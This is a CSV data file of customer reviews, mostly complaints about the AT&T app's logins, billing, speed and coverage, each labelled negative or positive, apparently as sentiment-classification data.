Body,Sentiment
Why do I have to change my pass word all the time,negative
"No cbs for a week. No help from att. Prices are too high
Find another service",negative
It’s cumbersome. It’s difficult to navigate. I can never access the information I wish. It’s a total disaster.,negative
"AT&T plans are outrageous, for the plan with little channels they are over charging! They are like a loan shark!!!",negative
The app does not work on a VPN. I have disable my VPN to access my AT&T account.,negative
Really bad service,negative
"I used the widget daily until it stopped working. I reloaded the app and the widget worked intermittently. After a few days the widget stopped updating so I reloaded the app again. Now the widget is gone completely . Since I use it extensively, I would like it back.",negative
"It’s really hard to get done what you want on this. It takes forever to load. Worse yet, every time you land on the home page it wants a review. If you say later, it just asks again.

So one star.",negative
Everything I click takes forever to load. It’s only with this app.,negative
Signal is terrible,negative
I have to try multiple times to load data,negative
"This app looks cool and easy to use, the information that comes up on my account is usually fairly accurate!",positive
Nice and quick.,positive
This app is a waste of time only thing you can do with it is pay your bill,negative
Your ability to satisfy basic customer needs has dwindled,negative
Never works always shuts off on me,negative
"Why am I being asked to enter my password again, when I have the app set to save my password and also use Touch ID. Could someone else have stolen my thumb just to get into my AT&T app? Makes no sense.",negative
"I can’t give you any stars.  I have considered changing service providers on more than one occasion; only my wife has been an advocate for you.  Now that Direct TV is a part of your family we now pay three (3) separate bills.  They can’t be consolidated because of different locations.  I have had SO MUCH TROUBLE WITH GETTING YOUR APP TO WORK, I refuse to risk not being able to pay all of them.i usually end up having to go to your retail store to pay them now.  AND LETS NOT TALK ABOUT THE DIRETV NOW APP.  It’s terrible my experience has been equally as terrible.",negative
"Your app is difficult to understand.
My monthly bill is different each month and your customer service is very bad.
You made me sign a two year contract to get my 4K service and it never worked right.
I want to cancel my service with your company and I have to pay a early cancelation fee for bad service and equipment Your computer notes are incorrect so as some as I can I will cancel your service and go To PlayStation Vue for streaming service",negative
Useless because it is confusing in what it seeks for finding and resetting ID/PW,negative
I wanted just to change the card number for how I was getting billed already. I got messed up in all the ways to pay it is so confusing.,negative
App is very slow and clunky. Hard to use.,negative
"I’m asking you if you could please flip the switch so my
Works as simply as my old line 350-6676. Ever since I’ve change numbers my bills have fluctuated by $30! I’m also getting data charges because my phone says that I am hooked upTo Wi-Fi when it is not.! If these changes are not made I’ll have no other choice but to change carriers. Which I would find a shame because I have been with your company including DIRECTV for decades.",negative
The app has not been working for months and AT&T has done nothing to fix it.,negative
after 2 hours in phone and live chat still cant get phone and direct tv on same app,negative
The service in my area is absolutely horrible!  Dropped calls and calls cut in and out!   Dissatisfied!,negative
Cant sign in cause its blocked by all your sponsors and affiliated crap. Have to get on a computer on full page to pay directv bill????????,negative
"Don’t like My Direct Service
Price is way too high
Struggle with finding accounts on here and trying to find payment 
Not user friendly for novice / amateur tech people.",negative
"I would just like to see all my devices and be able to click on each one for everything associated with that device.  Instead, I am caught in an endless and surreal loop of clicking on the same things with no results.  Please simplify the way data is organized by this app.",negative
"It sticks! Instead of being able to login using my thumb and pay my bill, the app gets stuck! Why insist that people use an app and then charge for calling in to make a payment because the payment won’t work because the app doesn’t work??",negative
I was never notified and I cannot afford that !please delete those charges,negative
My cell phone was not working in Hilo Hawaii so I went to an Att corporate store and I was told needed to make a payment so I did but now in Texas I can’t get into my att account and not able to get calls only messages also in settings can’t get into my WiFi network what can I do or take att store in Harlingen but will they help since my phone is a pay monthly phone -9562266070 is my number.,negative
Worst app I ever used,negative
I can’t even use the app! It’s frozen all the time. Can’t pay bill with the app.??,negative
Att is the worse cable service I have ever had once this contract is up I am switching services just horrible,negative
Muy buena,positive
"This app is always slow to connect, and always unable to show account information “due to technical errors”. It’s useless and frustrating.",negative
"App people should be fired!!
Horrible every time I try to use this.
Have to sign in every time & locks me out!!",negative
My bill is a mess I will be leaving ATT,negative
We have had uverse for close to a year and a half. We have never gotten consistent service. It’s always going in and out. They offer a $20 credit. ????? What can you do?,negative
"I have to be polite here.   This app makes you constantly change your password.  Practically every time you use it.  It takes forever to load and will often take you in circles.  For live chat, it’s live with digital A.I.   Not exactly live,  just a toaster.   AT&T for an alleged high tech company can certainly do better, but they cheated out.",negative
........,negative
It’s slow just like the service.  The dashboard gives you a mediocre overview.  But it’s a struggle to accomplish anything on this garbage app.  I regret ever changing to At&T.  T mobile was far better and that’s saying something.,negative
I cannot make a payment or setup for payment. It sends me to a blank screen.,negative
"Every time I try to use this app, after signing it the app wants to text me a code to verify I am me. However this never works and the screen basically freezes up.",negative
"Like a LOT of reviewers here, at&t kept increasing my bill amount with NO change in service. Since May. U do that, at&t & soon NOBODY will b paying yo jacked up prices bcuz we will all b switching 2 another celly service. Individual plans r WAY 2 pricey, the app is clunky & I have 2 CONSTANTLY change my password, & they just suddenly up the price of their plans without any notific8ion. I will b 1 less paying customer 4 u guys. So that’s $80 a month less 4 u guys. Buh bye. ????",negative
Very easy to use. My English is not very good. But att very good,positive
"The worst app!!!
Every time I want to use the app, I have to/ force to change password which take 10-15 minutes to get to my account to see the usage or bills or whatever. 
Worst app. If I could give it less than one star I would have.",negative
Service is not great,negative
"I’m not sure the purpose of the Face ID, if I have to still sign- in. It’s annoying.",negative
"THEY REPRESENTATIVE ALWAYS GIVE FALSE AND INCORRECT INFORMATION. When you ask to speak to a supervisor, they ALWAYS say they’re on the phone with a customer.",negative
The cost of the two phones on my Acct plus the tablet is extraordinary high. I will be changing service providers this month.,negative
Bring back Ma Bell!!!!,negative
I get an email saying go on at&t app to review the charges ( account overview ) I go there no help for the direct tv charges ?,negative
It’s verry helpful.,positive
"After a long while login for payments, now I can’t. I get messages I need to link accounts even though nothing changed. Tried to link but my account not recognized, website is the same,guess I’ll make a trip to the AT&T store to pay, waiting on a call back for help but never came",negative
I just subscribed to watchtv but it will not allow me to log in and says data plan not available. I don’t want to pay 95.00 for something I can’t watch,negative
"Ditto to all of those bad ratings. Think it is about time for you to get your act together. 

I dread trying to pay my bill since I know it will take forever!",negative
Don’t believe any promotions they try to sell you. They’re masters at bait and switch!!!,negative
I have been trying for months to get the issue straightened out where I can view my bill. I’m tired of talking to different people that tell me it will be corrected and has not.,negative
Boo,negative
Not happy with it.  Every time I try to go on the app it says password does not match user I’d so I have to change and reset my password and then it says it is having problems locating this account.  Not easy to keep trAck of accounts,negative
Hard to maneuver around in the phone bill online. There are no percentages on the talk card I think that needs to be included just like the percentages on the text.,negative
There are too many login screens once I’ve already logged in and the app is so sensitive and skips around. Makes it impossible to use to do more than check my bill. It’s not user friendly as anything more than a dashboard.,negative
"I love the app, it makes paying my bill very easy. One touch and my bill is paid. 

Thank you AT&T",positive
That says it all.,negative
One of the worst apps I ever had still can’t create an account been trying for hours. Highly don’t recommend this app to anyone!!,negative
It was kind of nice but scary.,positive
"Ordered a movie ,the movie skipped 4 scenes on the movie ( this is us ) 
Called the guy said that he could remove it told me he was sorry . 
Next month comes around I’m being charged a late fee AND the bill for the movie . 
But for ONE I’m never late on my payment and they were supposed to have taken the movie off my bill. Then wouldn’t take anything off when I called and asked what was going on .. 
very upset",negative
"Of all the account apps I have, this has to be the most frustrating to use. I’d say about 75% I can’t even get logged in and give up—this may be by design so you can’t figure out why you are being charged an extra $11 a month all of a sudden. (If you can’t tell, that’s been my most recent experience.) 
It’s a pretty clunky interface as well once you actually get logged in. The chat is slow and most of the responses to my issues either are copy and pasted or it’s a computer. D-",negative
I keep getting kicked out. Awful app. Awful company,negative
We had great service about 3 weeks ago at our house and now we sometimes get NO service!!!  They have changed something in our area and I have no clue what happened. I’m going to cancel as soon as contract is up. And I know I’m not important because I’m just 1 in a trillion customers.,negative
I tried to place an order for sandwiches but no one would answer the phone! Another time I tried to order 20 sandwiches for a party and I still could not get anyone to answer even after calling and getting hold of the catering part of Subway. They were supposed to call for me since noone would answer at the store. Still they did not call.,negative
The billing website takes too long to update on phone app. Just tried laptop with same results - slow.,negative
"I like ATT..VERY MUCH. sometimes it gets confusing too me because I’m a dinosaur when it comes to using apps and such devices to set my payments and such or view stuff. It’s not difficult with att but I make it difficult. 
I know, though, when I call, they are always so helpful and understanding to my needs and concerns..",positive
Why is it I can go out get a monthly pay as you go plan cheaper than deal with you idiots?,negative
The App works like their coverage.  Half at best... So tired of their crappy coverage and app issues.,negative
Third time and I can’t transfer my phone from straight talk.  Looks like it’s back to Verizon.,negative
Must say this app has never giving me any problems great too and information pay my bill manage my device etc... great app frank m,positive
mala aplicacion se congela,negative
Mobile app is very useful and easy to use,positive
Too expensive for 3 phones looking to switch,negative
Doesn’t work at all,negative
It only works once in a while. Sometimes it lets me log in but mostly doesn’t,negative
I can only click on half of the options. The app is non-responsive,negative
"Samuel M. Was very kind, understanding and helpful. He took the time to hear me out and provided a great experience for me as a loyal customer of AT&T. Thank you Samuel M!",positive
I found the rep rude and flippant,negative
"Technician suggested that I install this app to check usage, bills, service appointments and all sorts of information. Worked the first time after installing and has not worked since. I have uninstalled and reinstalled, changed password, every thing I can think of and it still is not working. After the verification code is sent to my device, I input it and get a message, “Hmmm, looks like something went wrong. Try again later” this is as far as I have gotten since initial sign on.",negative
My bill has never been consistent with you guys. Every month it changes. one month 40$ then the next months 110$! And I never added anything! This is why I cancelled with you guys the first time. I can’t wait until this contract is up. You have lost my business for good this time.,negative
I have tried and tried to pay our bill on our services for our previous acct for tv and internet without success so I always had to go to ATT store to pay with my credit card on the kiosk. We have moved and those services have been terminated except for transfer of my internet- I’m very confused about my final bill and I’m unable to pay it online- I don’t think I should have to pay a fee to talk to someone to make final payment!,negative
Good job please keep up the good work!!!,positive
This is the most confusing app I have ever tried to sign into. Need simpler sign in procedure. Very confusing.,negative
"I chatted with Brandon and he was very helpful and professional, it was nice to have that experience with customer service.",positive
Excellent service,positive
They’ve destroyed this app; it’s hideous now.,negative
"My ideal of unlimited is not to set a limit on my plan and slow it down when that limit is reached, that might be unlimited access to login, but not to stream movies or do work online.",negative
But it rarely works,negative
